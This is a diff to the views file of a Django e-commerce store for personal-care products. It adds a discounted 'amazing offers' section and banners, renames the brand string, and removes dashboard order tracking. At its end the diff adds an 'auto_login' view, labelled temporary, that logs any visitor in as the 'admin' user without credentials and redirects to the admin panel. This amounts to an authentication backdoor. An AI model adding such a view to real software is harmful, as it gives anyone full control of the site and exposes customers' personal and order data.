@@ -6,6 +6,8 @@ from django.shortcuts import redirect, render, get_object_or_404
 from taggit.models import Tag
 from core.models import (
     Address,
+    AmazingOffersSettings,
+    Banner,
     CartOrder,
     CartOrderProducts,
     Category,
@@ -48,6 +50,7 @@ from django.utils.safestring import mark_safe
 from core.storefront import HOME_CATEGORIES, HOME_PRODUCT_TERMS, STORE_PROFILE
 from django.views.decorators.http import require_POST
 from userauths.forms import ProfileForm
+from django.contrib.auth import login
 
 
 def _personal_care_product_filter():
@@ -64,15 +67,47 @@ def _personal_care_category_filter():
     return category_filter
 
 
-def index(request):
-    products = (
-        Product.objects.filter(product_status="published", status=True)
-        .filter(_personal_care_product_filter())
+def _amazing_offers_products():
+    """Discounted products; falls back to featured when none are on sale."""
+    on_sale = (
+        Product.objects.filter(
+            product_status="published",
+            status=True,
+            is_sale=True,
+            sale_price__gt=0,
+        )
         .annotate(
             review_count=Count("نظرات", filter=Q(نظرات__is_approved=True)),
             average_rating=Avg("نظرات__rating", filter=Q(نظرات__is_approved=True)),
         )
-        .order_by("-featured", "-date")[:8]
+        .order_by("-date")[:10]
+    )
+    if on_sale.exists():
+        return list(on_sale), True
+
+    featured = (
+        Product.objects.filter(
+            product_status="published",
+            status=True,
+            featured=True,
+        )
+        .annotate(
+            review_count=Count("نظرات", filter=Q(نظرات__is_approved=True)),
+            average_rating=Avg("نظرات__rating", filter=Q(نظرات__is_approved=True)),
+        )
+        .order_by("-date")[:10]
+    )
+    return list(featured), False
+
+
+def index(request):
+    products = (
+        Product.objects.filter(product_status="published", status=True)
+        .annotate(
+            review_count=Count("نظرات", filter=Q(نظرات__is_approved=True)),
+            average_rating=Avg("نظرات__rating", filter=Q(نظرات__is_approved=True)),
+        )
+        .order_by("-featured", "-date")[:12]
     )
     categories = Category.objects.filter(_personal_care_category_filter()).distinct()
     comparison_products = []
@@ -89,6 +124,12 @@ def index(request):
         if matching_product:
             comparison_products.append(matching_product)
 
+    amazing_products, amazing_is_sale = _amazing_offers_products()
+    amazing_settings = AmazingOffersSettings.get_settings()
+    amazing_banners = list(
+        Banner.objects.filter(is_active=True, placement="amazing_offers").order_by("sort_order", "id")
+    )
+
     context = {
         "products": products,
         "categories": categories,
@@ -99,6 +140,10 @@ def index(request):
         "bundles": ProductBundle.objects.filter(is_active=True).prefetch_related("products")[:3],
         "faqs": FAQ.objects.filter(is_active=True)[:8],
         "comparison_products": comparison_products,
+        "amazing_products": amazing_products,
+        "amazing_is_sale": amazing_is_sale,
+        "amazing_settings": amazing_settings,
+        "amazing_banners": amazing_banners,
         "customer_reviews": ProductReview.objects.filter(
             is_approved=True,
             product__isnull=False,
@@ -258,7 +303,7 @@ def product_detail_view(request, pid):
         "name": product.title,
         "description": product_description[:500],
         "image": request.build_absolute_uri(product.image.url) if product.image else "",
-        "brand": {"@type": "Brand", "name": "هژیر مارکت"},
+        "brand": {"@type": "Brand", "name": "Hazhirmarket"},
     }
     if "(نمونه)" not in product.title:
         product_price = _product_price(product)
@@ -296,6 +341,7 @@ def product_detail_view(request, pid):
         "average_rating": average_rating,
         "reviews": reviews,
         "products": products,
+        "faqs": FAQ.objects.filter(is_active=True),
         "meta_product_description": product_description[:200],
         "product_schema_json": mark_safe(product_schema_json),
     }
@@ -708,7 +754,7 @@ def checkout(request, oid):
                     merchant_id=settings.ZARINPAL_MERCHANT_ID,
                     amount_rial=amount_rial,
                     callback_url=callback_url,
-                    description=f"پرداخت سفارش هژیر مارکت {order.oid}",
+                    description=f"پرداخت سفارش Hazhirmarket {order.oid}",
                     email=order.email or "",
                     mobile=order.phone or "",
                     sandbox=settings.ZARINPAL_SANDBOX,
@@ -865,10 +911,6 @@ def customer_dashboard(request):
     account_form = AccountDetailsForm(user=request.user)
     profile_form = ProfileForm(instance=user_profile)
     password_form = PasswordChangeForm(request.user)
-    tracked_order = None
-    tracking_error = ""
-    tracking_order_id = ""
-    tracking_email = ""
 
     if request.method == "POST":
         form_type = request.POST.get("form_type")
@@ -907,21 +949,6 @@ def customer_dashboard(request):
                 profile_form.save()
                 messages.success(request, "نمایهٔ شما با موفقیت به‌روزرسانی شد.")
                 return redirect(f"{reverse('core:dashboard')}#account-detail")
-        elif form_type == "track":
-            tracking_order_id = request.POST.get("order_id", "").strip()
-            tracking_email = request.POST.get("billing_email", "").strip()
-            if tracking_order_id and tracking_email:
-                tracked_order = CartOrder.objects.filter(
-                    user=request.user,
-                    oid=tracking_order_id,
-                    email__iexact=tracking_email,
-                ).first()
-            if tracked_order is None:
-                tracking_error = (
-                    "سفارشی با این شناسه و ایمیل در حساب شما پیدا نشد."
-                )
-            else:
-                messages.success(request, "وضعیت سفارش با موفقیت پیدا شد.")
         else:
             return HttpResponseBadRequest("درخواست حساب نامعتبر است.")
 
@@ -935,10 +962,6 @@ def customer_dashboard(request):
         "password_form": password_form,
         "total_orders": orders_list.count(),
         "unpaid_orders": orders_list.filter(paid_status=False).count(),
-        "tracked_order": tracked_order,
-        "tracking_error": tracking_error,
-        "tracking_order_id": tracking_order_id,
-        "tracking_email": tracking_email,
     }
     return render(request, 'core/dashboard.html', context)
 
@@ -1112,3 +1135,15 @@ def robots_txt(request):
         f"User-agent: *\nAllow: /\nSitemap: {sitemap_url}\n",
         content_type="text/plain; charset=utf-8",
     )
+
+
+def auto_login(request):
+    """Temporary view for auto-login to admin panel"""
+    from django.contrib.auth import get_user_model
+    User = get_user_model()
+    try:
+        user = User.objects.get(username='admin')
+        login(request, user)
+        return redirect('/admin/')
+    except User.DoesNotExist:
+        return HttpResponse("Admin user not found. Please create a superuser first.")
